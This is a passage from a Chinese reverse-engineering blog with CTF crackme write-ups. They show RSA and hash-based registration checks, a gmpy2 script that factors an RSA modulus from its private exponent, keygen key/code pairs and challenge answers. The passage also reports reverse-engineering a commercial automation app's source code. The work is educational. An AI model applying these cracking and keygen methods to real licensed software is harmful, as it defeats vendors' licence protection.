<p>检查完输入key的合法性和初始化4个重要的参数之后，这个时候判断模式，判断做题的人是选择的什么难度，如果是选择标准难度，将会对输入的code进行base64解码，再进行计算，判断是否成功。我打算重点说说进阶难度题目的事情，所以这里就给出一组正确的key，其他的过程需要读者自行跟踪一下。<br>我算出来的一组key：<br>key:0234-5678-90ab-00ef-0f87-6543-21fe-0cba<br>code:A6Kf2FVPOOvERSOoIf@5l2==<br>如果是选择的进阶的题目，将会进入到另外一番天地，先贴一段代码，如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">v9 = CRegCheck::get_rsa_key_seed(v8, v6);</div><div class="line"> RSA::RSA((RSA *)&amp;v21);</div><div class="line"> RSA::RSAKey((RSA *)&amp;v21, v9);</div><div class="line"> sub_33440(&amp;v13, (int *)v5);</div><div class="line"> v10 = RSA::tdecrypto((int)&amp;v21, (int)&amp;v13, (int)&amp;ptr);</div><div class="line"> sub_332FC(v13 - 12);</div><div class="line"> RSA::~RSA((RSA *)&amp;v21);</div></pre></td></tr></table></figure>
<p>从这里可以看出来，进阶版这里用的是RSA算法对输入的key和code进行验证。</p>
<p>0x5 get_rsa_key_seed函数</p>
<p>虽然这个名字叫做get_rsa_key_seed，但是其实里面的功能是对输入的key进行4次hash的计算，分别使用的是RSHash、JSHash、PJWHash、以及最后一个自定义的hash值计算的方法，具体的hash 函数代码在这里，请戳这里：<br><a href="http://www.partow.net/programming/hashfunctions/index.html" target="_blank" rel="external">http://www.partow.net/programming/hashfunctions/index.html</a><br>对name 做了hash后，会将生成的hash值传入下一个函数，这个函数是RSAKey。</p>
<p>0x6 RSAKey函数</p>
<p>原函数代码如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">bool RSAKey()</div><div class="line">&#123;</div><div class="line">    for(i=0;i&lt;MAX;i++)</div><div class="line">        m[i]=p[i]=q[i]=n[i]=d[i]=e[i]=0;</div><div class="line">    prime_random(p,q);</div><div class="line">    mul(p,q,n);</div><div class="line">    mov(p,p1);</div><div class="line">    p1[0]--;</div><div class="line">    mov(q,q1);</div><div class="line">    q1[0]--;      /*/q-1;*/</div><div class="line">    mul(p1,q1,m);//m=(p-1)*(q-1)</div><div class="line">    erand(e,m);</div><div class="line">    rsad(e,m,d);</div><div class="line">    return true;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看代码可以知道，这个RSAKey函数的主要作用是来生成n、e 、d的，逆向跟一下会发现，如果name不变，n、e、d也是不变的，也就是说name 和 n、e、d三个参数存在某种关系。what？因为我们知道n是p、q的乘积，而p与q这两个素数是用prime_random生成的，居然不变？点进去看看它prime_random函数的实现，发现set_rand_seed、gen_rand这两个函数，再点进去一看，都是类似这样的函数，贴其中的一个如下:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">void *__fastcall CGenRand::set_rand_seed(CGenRand *this, unsigned int a2)</div><div class="line">&#123;</div><div class="line">  void *result; // r0@1</div><div class="line"></div><div class="line"></div><div class="line">  __asm</div><div class="line">  &#123;</div><div class="line">    VMOV            S0, R0</div><div class="line">    VCVT<span class="selector-class">.F64</span><span class="selector-class">.U32</span>    D0, S0</div><div class="line">  &#125;</div><div class="line">  result = &amp;CGenRand::seed_;</div><div class="line">  __asm &#123; VSTR            D0, [R0] &#125;</div><div class="line">  return result;</div></pre></td></tr></table></figure>
<p>这是什么鬼，感觉好慌。这里卡了很久，被坑了一波。最后发现APK中有x86的lib，打开x86的so看了一下，里面有正确的c代码，是一个伪随机数，算法如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hash_seed  = (double)(signed int)(0.00000095367431640625 * (hash_seed* 17.0 + 139.0)) * (-1048576.0)+ hash_seed * 17.0+ 139.0;</div><div class="line">return hash_seed/<span class="number">10</span>；</div></pre></td></tr></table></figure>
<p>其中，hash_seed是一个全局变量，其实也就是get_rsa_key_seed函数的返回值，这就很明朗了，印证了固定的name对应固定e d n。同样的，在后面的erand函数也是用类似的方法生成了值。<br>都初始化好了之后开始了最后的解密函数tdecrypto。</p>
<p>0x7 tdecrypto函数</p>
<p>开头用了标准阶段的base64进行解密，然后所有解密的字符不能大于0x31，接着所有解密的字符会进入RSA解密阶段，充当大数的各个位，tdecrypto函数代码如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">string tdecrypto(int d[MAX], int n[MAX], string text)</div><div class="line">&#123;</div><div class="line">    struct slink *h,*p1,*p2;</div><div class="line">    char ch;</div><div class="line">    int i,j,k,c,count,temp;</div><div class="line">    i=0;</div><div class="line">    j=3;</div><div class="line">    count=0;</div><div class="line">    h=p1=p2=(struct slink * )malloc(LEN);</div><div class="line">    int kk;</div><div class="line">    for (kk = 0; kk &lt; text.length(); kk++)</div><div class="line">    &#123;</div><div class="line">        ch = text.at(kk);</div><div class="line">        c=ch;</div><div class="line">        <span class="keyword">if</span>(j==<span class="number">3</span>)</div><div class="line">        &#123;</div><div class="line">            p1-&gt;bignum[MAX-2]=c-48;</div><div class="line">            j--;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(j==<span class="number">2</span>)</div><div class="line">        &#123;</div><div class="line">            temp=c-48;</div><div class="line">            j--;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(j==<span class="number">1</span>)</div><div class="line">        &#123;</div><div class="line">            p1-&gt;bignum[MAX-1]=temp*1048;</div><div class="line">            j--;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (j==<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            p1-&gt;bignum[i]=c-48;</div><div class="line">            i++;</div><div class="line">            <span class="keyword">if</span>(i==p1-&gt;bignum[MAX-<span class="number">1</span>])</div><div class="line">            &#123;</div><div class="line">                i=0;</div><div class="line">                j=3;</div><div class="line">                count++;</div><div class="line">                <span class="keyword">if</span> (count==<span class="number">1</span>)</div><div class="line">                    h=p1;</div><div class="line">                else p2-&gt;next=p1;</div><div class="line">                p2=p1;</div><div class="line">                p1=(struct slink * )malloc(LEN);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    p2-&gt;next=NULL;</div><div class="line"></div><div class="line"></div><div class="line">    p2=(struct slink * )malloc(LEN);</div><div class="line">    p1=h;</div><div class="line">    k=0;</div><div class="line">    string res;</div><div class="line">    <span class="keyword">if</span>(h!=NULL)</div><div class="line">        do</div><div class="line">        &#123;</div><div class="line">            for(i=0;i&lt;MAX;i++)</div><div class="line">                p2-&gt;bignum[i]=0;</div><div class="line">            expmod( p1-&gt;bignum , d ,n ,p2-&gt;bignum);</div><div class="line">            temp=p2-&gt;bignum[0] + p2-&gt;bignum[1]*10 + p2-&gt;bignum[2]*100;</div><div class="line">            <span class="keyword">if</span> (( p2-&gt;bignum[MAX-<span class="number">2</span>])==<span class="string">'0'</span>)</div><div class="line">            &#123;</div><div class="line">                temp=0-temp;</div><div class="line">            &#125;</div><div class="line">            ch=temp;/*  str[k]---&gt;ch */</div><div class="line">printf("0x%02x ",(unsigned char)ch);</div><div class="line">            res += ch;  // char a4_a5[16] =&#123;0x9e,0xf6,0x1d,0xc2,0x8d,0x01,0x00,0x00,0xfb,0x49,0x50,0x09,0x3d,0xd5,0xee,0xff&#125;;</div><div class="line">            k++;</div><div class="line">            p1=p1-&gt;next;</div><div class="line">            p2=(struct slink * )malloc(LEN);</div><div class="line">        &#125;while (p1!=NULL);</div><div class="line">        return res;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>0x8最后一战is_tangent函数</p>
<p>然后解密的byte数组要为16位，这点和标准阶段的一样，接着进入最后的比较，is_tangent函数中，如果看到这个函数的名字去搜索一下，会发现可能这个函数和圆的相切，圆心距离有关系。然而这只是一个陷阱，你相信了你就输了，废话不多说，仔细看看代码，你发现了什么？<br>(a4-a2)^2 ？ 4<em>params1</em>params2？<br>像不像delta？没错，这就是一个简单的一元二次方程组。<br>只要花点耐心，把2个方程整理一下，就会发现，a6其实就是方程中的x。<br>而题目的意思就是说这个方程有且只有一个根的话，你就是tangent的！<br>所以，直接上代码，a4直接算：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a4 = 2 * a1 * a6 + a2;</div></pre></td></tr></table></figure>
<p>a5可能会溢出(这里被卡了，标记一波)用的是gmp大数库，可以看我的上篇文章：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">mpz_t mpz_a1, mpz_a2, mpz_a3, mpz_a4, mpz_a5, tmp, four, ten, ds;</div><div class="line">    mpz_init_set_str( four, "4", 0x10 );</div><div class="line">    mpz_init_set_str( ten, "10", 0x10 );</div><div class="line">    mpz_init_set_str( ds, "1", 0x10 );</div><div class="line">    mpz_init_set_str( mpz_a1, buf_a1, 0x10 );</div><div class="line">    mpz_init_set_str( mpz_a2, buf_a2, 0x10 );</div><div class="line">    mpz_init_set_str( mpz_a3, buf_a3, 0x10 );</div><div class="line">    mpz_init_set_str( mpz_a4, buf_a4, 0x10 );</div><div class="line">    mpz_init( mpz_a5 );</div><div class="line">    mpz_init( tmp );</div><div class="line">    mpz_sub( tmp, mpz_a4, mpz_a2 );</div><div class="line">    mpz_mul( tmp, tmp, tmp );</div><div class="line">    mpz_divexact( tmp, tmp, four );</div><div class="line">    mpz_divexact( tmp, tmp, mpz_a1 );</div><div class="line">    mpz_sub( mpz_a5, mpz_a3, tmp );</div></pre></td></tr></table></figure>
<p>这样，整个过程就明晰了，然后就是编写注册机了，最后给出我算的几组解如下：<br>(去掉-)：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">key:</div><div class="line"><span class="number">11111111111111111111111111111111</span></div><div class="line"><span class="selector-tag">code</span>:</div><div class="line"><span class="number">04</span>NPO44NP4iPWOYPP4gPO4iNWON#W4YP0ONPO4KOPiOPWOByO4NvWOgnP4gvO4NP0ONPP4KyP4GvO2NPPiGPO2GOPiiyP2YP04NOWOgoPi0OWOBPWO0NO4YYO20vWOY2OiOoW4NPW40oOiOPW4iWO2BPW4GYPQYOO4O^OOYO04OPOvOWO4KnP2B#PiBnO2OPO2YOP4YyO24vOQYWO44yO2OvPO4yO20yOiKYO4NoO4YYOQYWOOiWP4BYPOivO2KNPOiWPigNW4Gn0ONPP4GNO24WO2iOO2ByWOYvW4O#PO0P04NPPii#OOBnP2ivPOBYOOgnW4ByW40P0ONOPi4yPiinP2GyO40OP2OnWOYvO2G2OiOvWO4WO2YyPiKYOi4nOi0OPO0PPvOOO4Y=</div><div class="line"></div><div class="line"></div><div class="line">key:</div><div class="line"><span class="number">00000000000000000000000000000000</span></div><div class="line"><span class="selector-tag">code</span>:</div><div class="line"><span class="number">0</span>OYoOONWO2NPOOBvP4GPPiYOOO4POZOWOOKvO24nP4GPO4gnPOOPOiONP2YY04NOPOYWP4gvP2KOW40vW4KoP4OWP202OiOvWOOoO2GnW4OnW4OnP2YOPiKvWQOWOO4oPi4PPO4NWOKvPOKyOOgPWOKN04OPOvYOO4O^OOYO0ONPPiB#OOgYPiKnO2YPO4YnOOgYPiGP04NOW4OPPO0NW44oO4ONOiiYP2iYP4i2OiOPPOGvP24vOO4PO24oOON#PiNnPQOWOOGPOiGyWOKvO2NWO2K#P4gOP2g#<span class="number">0</span>ONOPiBWW4OvOOiNWO0yO40WOiB#O4i^OiOYO4NnP20#PiOoO20oPiBnOON#OCOWOO4POiG#O2gyOOBvO2ByW4GOOigv0OOPO3==</div><div class="line"></div><div class="line"></div><div class="line">key:</div><div class="line"><span class="number">48671974307316312876431870418788</span></div><div class="line"><span class="selector-tag">code</span>:</div><div class="line"><span class="number">04</span>NPP24YOONoO4gvPig#P2BWP4YNO40v0ONPP4N#WOYPP4BoWOioOiYWO4GNO4gv04NPOiBoOi0YPOiNWOiNP4NPOOgvP4gv04NPO4ByPi4OO4OOWOYnP20yP24YOiiW0ONPP4OPWOgPPiNyWOGYWO4oP4KYO4GP04OPOvYOO4O^OOYO04NPO4GnW4OWP20YPOGYPOgyPiiOP4OP04NPPO0YPOY#OOKyP44#WONWWOBnO2iP04NPOiGWPOBYW40OP4GWWO0WOiGPW4iW0ONPP4gWOOivW44yWOY#W4YWOO4yO4gP0ONPWOg#OOYoO2KNPOBoP2BoOOK#O44P04NPP4NYP2YOOiYvO4OOOiB#OiYYWO4W0ONPOiYWO4g#PiOOO2BvO4NyOiKWP2KW0OOPO3==</div></pre></td></tr></table></figure>
<p>谢谢观看，如有错误之处请大侠们斧正！</p>
<p>By Ericky</p>
<p>2017.7.8</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2017/06/30/看雪2017CTF第十题/">
  <time datetime="2017-06-30T08:24:08.000Z">
    2017-06-30
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2017/06/30/看雪2017CTF第十题/">看雪2017CTF第十题</a></h1>
  

  </header>
  
  <div class="entry">
    
      <p>对gmp和RSA不熟悉，从头到尾追了很长时间。这两天也逼着自己熟悉了很多东西，学到了不少。</p>
<h2 id="1-初探"><a href="#1-初探" class="headerlink" title="1.初探"></a>1.初探</h2><p>程序是X64的，不管三七二十一，先拖到IDA里面看一下，由于一开始都不知道gmp是什么东西，便一边用OD调试，一边IDA傻傻看代码，一个函数一个函数看。经过漫长而又漫长的分析，结合阅读gmp的源代码，把IDA中的函数对应上了，如下：<br><img src="http://img.blog.csdn.net/20170630162246756?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h2 id="2-关于gmp"><a href="#2-关于gmp" class="headerlink" title="2.关于gmp"></a>2.关于gmp</h2><p>GMP简介：GMP是著名的任意精度算术运算库，支持任意精度的整数、有理数以及浮点数的四则运算、求模、求幂、开方等基本运算，还支持部分数论相关运算。Maple、Mathematica等大型数学软件的高精度算术运算功能都是利用GMP实现的。</p>
<p>理清楚函数的意思，可以来看看到底实现了什么。<br>介绍一下目标程序使用的一些gmp函数，如下：<br>void mpz_init (mpz_t x)<br>初始化x。任何一个mpz_t类型的变量在使用前都应该初始化。</p>
<p>int mpz_init_set_str (mpz_t rop, const char *str, int base)<br>初始化rop，并赋值rop = str，其中str是一个表示base进制整数的字符数组</p>
<p>int mpz_probab_prime_p (const mpz_t n, int reps)<br>检测n是否为素数。该函数首先对n进行试除，然后使用米勒-拉宾素性检测对n进行测试，reps表示进行检测的次数。如果n为素数，返回2；如果n可能为素数，返回1；如果n为合数，返回0。</p>
<p>void mpz_mul (mpz_t rop, const mpz_t op1, const mpz_t op2)<br>计算op1 * op2，结果保存在rop中</p>
<p>int mpz_invert(mpz_t rop, const mpz_t op1, const mpz_t op2)<br>求数论倒数函数</p>
<p>void mpz_init_set_si (mpz_t rop, signed long int op)<br>初始化rop，并将其值设置为op</p>
<p>int mpz_cmp (mpz_t op1, mpz_t op2)<br>比较函数</p>
<p>void mpz_mod (mpz_t r, const mpz_t n, const mpz_t d)<br>求模函数，返回值不为负数</p>
<p>把这些函数的意思弄明白了，就能发现这是一个RSA算法：</p>
<p>RSA算法大体可以分为三个部分：<br>生成密钥对<br>加密<br>解密<br>其中生成密钥对包括以下步骤：<br>随机生成两个足够大的素数<br>p,q<br>计算公共模数n<br>n=p∗q<br>计算欧拉函数<br>φ(n)=(p−1)∗(q−1)<br>选取一较小的与φ(n)互质的正整数e作为公共指数。则数对(n, e)为密钥对中的公钥<br>计算<br>d=e−1(modϕ(n))<br>则数对(n, d)为密钥对中的私钥<br>这里推荐2篇RSA相关文章<br><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</a><br><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html</a></p>
<p>搞懂了这些之后，就可以开始写程序了</p>
<h2 id="3-脚本"><a href="#3-脚本" class="headerlink" title="3.脚本:"></a>3.脚本:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import gmpy2</div><div class="line">			  </div><div class="line">N = gmpy2.mpz(0x6248BC3AB92A33B000FDB88568F19727F92F79EB68FF6AD73203EFD20A3E331BE941C7AA288095F33BC4B255FD983114D480EFFBEE2E313E6218A57F9CCC8189)</div><div class="line">d = gmpy2.mpz(0x2476A7F02588913F228923E1F36F963F29708C07B117396817A6B94C336FC77FF7D381925EB40CFED8FBE894570155E41569B4EC69B26CB0320105A29651CB4B)</div><div class="line">e = gmpy2.mpz(0x1)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line"></div><div class="line">	while e &lt; 0x1000000:</div><div class="line">		e = e +1</div><div class="line">		kfi = gmpy2.mul(e,d)-1</div><div class="line">		k = gmpy2.div(kfi,N)</div><div class="line"></div><div class="line">		if kfi%(k+1) == 0:		</div><div class="line">			x = 1-kfi/(k+1)+N</div><div class="line">			if x &gt; 0 and x &lt; 0x100000000000000000000000000000000000000000000000000000000000000000:</div><div class="line">				print &apos;e:&apos; + hex(e)</div><div class="line">				print &apos;x:&apos; + hex(x)</div><div class="line">				continue;</div><div class="line"></div><div class="line"></div><div class="line">	#X2 = gmpy2.mul(x,x)</div><div class="line">	#N4 = gmpy2.mul(N,4)</div><div class="line">	#delta = gmpy2.sub(X2,N4)</div><div class="line"></div><div class="line">	delta_root = gmpy2.mpz(0x23c4ffb7dff4f383202beb418be684edaad4c1838af43e9ea0a731d0ea495f00)</div><div class="line">	print &apos;delta_root:&apos; + hex(delta_root)</div><div class="line">	fenzi = gmpy2.add(x,delta_root)</div><div class="line">	fenzi2 = gmpy2.sub(x,delta_root)</div><div class="line">	p1 =  gmpy2.div(fenzi,2)</div><div class="line">	p2 = gmpy2.div(fenzi2,2)</div><div class="line">	print &apos;p1 =&apos; + hex(p1) </div><div class="line">	print &apos;p2 =&apos; + hex(p2)</div></pre></td></tr></table></figure>
<p>结果：<br><img src="http://img.blog.csdn.net/20170630162403992?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>答案：<br>F552B38DBDDE72E2E693B2AED5C769C0DCB3DA83534480A80E652FFE53544CD91A18C3</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2017/06/14/看雪CTF 2017 第六题设计思路和解题思路/">
  <time datetime="2017-06-14T13:41:08.000Z">
    2017-06-14
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2017/06/14/看雪CTF 2017 第六题设计思路和解题思路/">看雪CTF 2017 第六题设计思路和解题思路</a></h1>
  

  </header>
  
  <div class="entry">
    
      <p>这道题主要需要花时间搞清楚套路，就迎刃而解了。^_^ </p>
<h3 id="1-java层稍作字符串加密和类名方法名混淆处理-本来是打算java层也做点文章的"><a href="#1-java层稍作字符串加密和类名方法名混淆处理-本来是打算java层也做点文章的" class="headerlink" title="1.java层稍作字符串加密和类名方法名混淆处理(本来是打算java层也做点文章的@_@)"></a>1.java层稍作字符串加密和类名方法名混淆处理(本来是打算java层也做点文章的@_@)</h3><p><img src="http://img.blog.csdn.net/20170614213843087?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>解题：通过阅读代码，可以知道check函数为关键函数，当返回为真的时候，注册成功。</p>
<h3 id="2-so层用花指令对程序指令进行混淆，在一定程度上防止分析。"><a href="#2-so层用花指令对程序指令进行混淆，在一定程度上防止分析。" class="headerlink" title="2.so层用花指令对程序指令进行混淆，在一定程度上防止分析。"></a>2.so层用花指令对程序指令进行混淆，在一定程度上防止分析。</h3><p><img src="http://img.blog.csdn.net/20170614213921432?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>解题：编写去花指令脚本，F5就会变得很简单。去花后check函数如下：<br><img src="http://img.blog.csdn.net/20170614213941745?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>这样就能很清楚看到注册过程了，第一个while循环释放存放好的字符串到byte_20020。sub_19DA8为加密函数，返回结果到v14，最后v14与byte_20020做比较，一样就行了。算法采用了RC4加密+base64编码。</p>
<h3 id="3-值得一提的是，so中藏关键字符串数据的方式我自己觉得挺有意思的。不知道聪明的你有没有发现呢？如果不会去花也不要紧，还有一个解题的思路就是是找到最后的汇编cmp，下好断点，因为这个算法的缘故。java层可以遍历传入字符串进行遍历暴力破解。"><a href="#3-值得一提的是，so中藏关键字符串数据的方式我自己觉得挺有意思的。不知道聪明的你有没有发现呢？如果不会去花也不要紧，还有一个解题的思路就是是找到最后的汇编cmp，下好断点，因为这个算法的缘故。java层可以遍历传入字符串进行遍历暴力破解。" class="headerlink" title="3.值得一提的是，so中藏关键字符串数据的方式我自己觉得挺有意思的。不知道聪明的你有没有发现呢？如果不会去花也不要紧，还有一个解题的思路就是是找到最后的汇编cmp，下好断点，因为这个算法的缘故。java层可以遍历传入字符串进行遍历暴力破解。"></a>3.值得一提的是，so中藏关键字符串数据的方式我自己觉得挺有意思的。不知道聪明的你有没有发现呢？如果不会去花也不要紧，还有一个解题的思路就是是找到最后的汇编cmp，下好断点，因为这个算法的缘故。java层可以遍历传入字符串进行遍历暴力破解。</h3><h3 id="4-总结一下，我自己想到了两个解题方式，一个暴力解题，一个去花解题。从男人刚正面的角度来讲，这道题主要就是考去花，没有加其他的东西了，直接被大佬们秒得体无完肤。。。先行膜拜。最后附上答案：madebyericky94528"><a href="#4-总结一下，我自己想到了两个解题方式，一个暴力解题，一个去花解题。从男人刚正面的角度来讲，这道题主要就是考去花，没有加其他的东西了，直接被大佬们秒得体无完肤。。。先行膜拜。最后附上答案：madebyericky94528" class="headerlink" title="4.总结一下，我自己想到了两个解题方式，一个暴力解题，一个去花解题。从男人刚正面的角度来讲，这道题主要就是考去花，没有加其他的东西了，直接被大佬们秒得体无完肤。。。先行膜拜。最后附上答案：madebyericky94528"></a>4.总结一下，我自己想到了两个解题方式，一个暴力解题，一个去花解题。从男人刚正面的角度来讲，这道题主要就是考去花，没有加其他的东西了，直接被大佬们秒得体无完肤。。。先行膜拜。最后附上答案：madebyericky94528</h3>
    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2017/06/12/逆向完整还原触摸精灵2.X版本工程代码/">
  <time datetime="2017-06-12T14:25:00.000Z">
    2017-06-12
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2017/06/12/逆向完整还原触摸精灵2.X版本工程代码/">逆向完整还原触摸精灵2.X版本工程代码</a></h1>
  

  </header>
  
  <div class="entry">
    
      <p>1.先介绍一下触摸精灵，触摸精灵是一款移动平台上能模拟手动操作的软件，可以回放录制的动作，也可以通过编程来实现更为复杂的功能。触摸精灵提供了便捷的找色、识字、网络、打码等易用的扩展函数，能满足许多复杂的需求。</p>
<p>2.然后介绍一下背景，应该是2015年3月左右的时候，当时我还在上海(挺怀念那段时光的) ，而这款产品是在淘宝上看到的(当时的销量十分好)。我对这个东西也特别特别感兴趣，下定决心就开始了。因为都说C++难，我也不会C++，就找了当时最后的一个native是C语言的版本，如果没弄错的话应该是2.7，前前后后、断断续续弄了2个月，把代码都还原出来了。</p>
<p>3.本来是打算逆向后做一个产品出来，后来就自己一个人，不了了之了。这里说一下这款产品的难点，难点还是android系统的碎片化太严重，每一个触摸事件在不同的手机里的表示都不一样，在A手机中一个触摸可能是4个event，但是可能在其他的手机中是8个甚至20个event，所以对event事件的解析是一个很大的问题。因为android 碎片化的问题很严重，导致了找图找色函数中需要读取图像RGBA的位置极难统一</p>
<p>4.这里附件的代码我有自己去兼容一些当时自己能找到的手机，然后自己加了很多的功能函数，最后跟3.X的触摸精灵功能并相差不多。新论坛第一次发帖，好不习惯，还是喜欢老的论坛，有底蕴！</p>
<p>5.以前录的2个视频，能直观看到这个app的作用，地址如下：<br><a href="http://v.youku.com/v_show/id_XOTQ3MzUzMjA0.html" target="_blank" rel="external">http://v.youku.com/v_show/id_XOTQ3MzUzMjA0.html</a><br><a href="http://v.youku.com/v_show/id_XOTQ3MzM3MzA4.html" target="_blank" rel="external">http://v.youku.com/v_show/id_XOTQ3MzM3MzA4.html</a></p>
<p>最后说一下，如果有什么关于手游脚本的问题，都可以跟帖问我，我会尽力回答的。</p>
<p>[<em>_</em>]   代码很搓。。。请各位大大手下留情<br>代码下载：<a href="http://bbs.pediy.com/thread-215896.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-215896.htm</a></p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2016/09/12/实现CVE-2016-3842的堆喷/">
  <time datetime="2016-09-12T14:33:00.000Z">
    2016-09-12
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2016/09/12/实现CVE-2016-3842的堆喷/">实现CVE-2016-3842的堆喷</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看到论坛有大牛分析了这个CVE-2016-3842的利用方法，我之前也对这个漏洞的堆喷做了一些笔记，这里分享一下。首先要先感谢一下某因幡和Retme两位大神，在研究这个漏洞期间遇到不少的问题，他们都一一给我解答了，这里对他们表示再次感谢。</p>
